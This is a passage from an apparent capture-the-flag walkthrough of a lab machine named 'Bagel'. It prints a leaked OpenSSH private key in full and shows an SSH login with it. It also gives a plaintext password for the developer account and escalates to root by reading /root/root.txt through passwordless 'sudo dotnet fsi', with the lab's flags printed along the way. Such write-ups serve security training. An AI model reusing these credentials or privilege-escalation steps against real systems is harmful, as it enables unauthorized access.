sKbBBUT42Rb\nzHYDsq2CatGezy1fx4EGFoBQ5nEl7LNcdGBhqnssQsmtB/Bsx94LCZQcsIBkIHXB8fraNm\niOExHKnkuSVqEBwWi5A2UPft+avpJfAAAAwQC6PBf90h7mG/zECXFPQVIPj1uKrwRb6V9g\nGDCXgqXxMqTaZd348xEnKLkUnOrFbk3RzDBcw49GXaQlPPSM4z05AMJzixi0xO25XO/Zp2\niH8ESvo55GCvDQXTH6if7dSVHtmf5MSbM5YqlXw2BlL/yqT+DmBsuADQYU19aO9LWUIhJj\neHolE3PVPNAeZe4zIfjaN9Gcu4NWgA6YS5jpVUE2UyyWIKPrBJcmNDCGzY7EqthzQzWr4K\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----",
    "WriteFile": null
  },
  "WriteOrder": null,
  "ReadOrder": null
}
```

```c
$ cat phil_id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
nrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=
-----END OPENSSH PRIVATE KEY-----
```

```c
$ chmod 600 phil_id_rsa
```

```c
$ ssh -i phil_id_rsa phil@bagel.htb
Last login: Sun Feb 19 14:54:31 2023 from 10.10.14.40
[phil@bagel ~]$
```

## user.txt

```c
[phil@bagel ~]$ cat user.txt
930ea1eb85391b1feeac90e3c2cfee08
```

### Enumeration

```c
[phil@bagel ~]$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

```c
[phil@bagel ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for phil:
```

```c
[phil@bagel ~]$ ls -la
total 24
drwx------. 4 phil phil 4096 Jan 20 14:14 .
drwxr-xr-x. 4 root root   35 Aug  9  2022 ..
lrwxrwxrwx. 1 root root    9 Jan 20 17:59 .bash_history -> /dev/null
-rw-r--r--. 1 phil phil   18 Jan 20  2022 .bash_logout
-rw-r--r--. 1 phil phil  141 Jan 20  2022 .bash_profile
-rw-r--r--. 1 phil phil  492 Jan 20  2022 .bashrc
drwxrwxr-x. 3 phil phil 4096 Oct 22 21:16 .dotnet
drwx------. 2 phil phil   61 Oct 23 18:59 .ssh
-rw-r-----. 1 phil phil   33 Feb 19 06:41 user.txt
```

```c
[phil@bagel .dotnet]$ ls -la
total 8
drwxrwxr-x. 3 phil phil 4096 Oct 22 21:16 .
drwx------. 4 phil phil 4096 Jan 20 14:14 ..
-rw-rw-r--. 1 phil phil    0 Oct 22 21:16 6.0.108.aspNetCertificateSentinel
-rw-rw-r--. 1 phil phil    0 Oct 22 21:15 6.0.108.dotnetFirstUseSentinel
-rw-rw-r--. 1 phil phil    0 Oct 22 21:15 6.0.108.toolpath.sentinel
drwxrwxr-x. 3 phil phil   26 Oct 22 21:16 corefx
```

## Privilege Escalation to developer

```c
[phil@bagel ~]$ su developer
Password: 
[developer@bagel phil]$
```

| Username | Password |
| --- | --- |
| dev | k8wdAYYKyhnjg3K |

### Pivoting

```c
[developer@bagel ~]$ sudo -l
Matching Defaults entries for developer on bagel:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

```c
[phil@bagel ~]$ dotnet --list-sdks
6.0.113 [/usr/lib64/dotnet/sdk]
```

```c
[phil@bagel ~]$ dotnet --list-runtimes
Microsoft.AspNetCore.App 6.0.13 [/usr/lib64/dotnet/shared/Microsoft.AspNetCore.App]
Microsoft.NETCore.App 6.0.13 [/usr/lib64/dotnet/shared/Microsoft.NETCore.App]
```

```c
[phil@bagel ~]$ su developer
Password:
```

```c
[developer@bagel phil]$ sudo /usr/bin/dotnet fsi

Welcome to .NET 6.0!
---------------------
SDK Version: 6.0.113

----------------
Installed an ASP.NET Core HTTPS development certificate.
To trust the certificate run 'dotnet dev-certs https --trust' (Windows and macOS only).
Learn about HTTPS: https://aka.ms/dotnet-https
----------------
Write your first app: https://aka.ms/dotnet-hello-world
Find out what's new: https://aka.ms/dotnet-whats-new
Explore documentation: https://aka.ms/dotnet-docs
Report issues and find source on GitHub: https://github.com/dotnet/core
Use 'dotnet --help' to see available commands or visit: https://aka.ms/dotnet-cli
--------------------------------------------------------------------------------------

Microsoft (R) F# Interactive version 12.0.0.0 for F# 6.0
Copyright (c) Microsoft Corporation. All Rights Reserved.

For help type #help;;

>
```

## root.txt

```c
> System.IO.File.ReadAllText("/root/root.txt");;
val it: string = "ed58c67adf157de1d1c0e7c92071bbfd
"
```
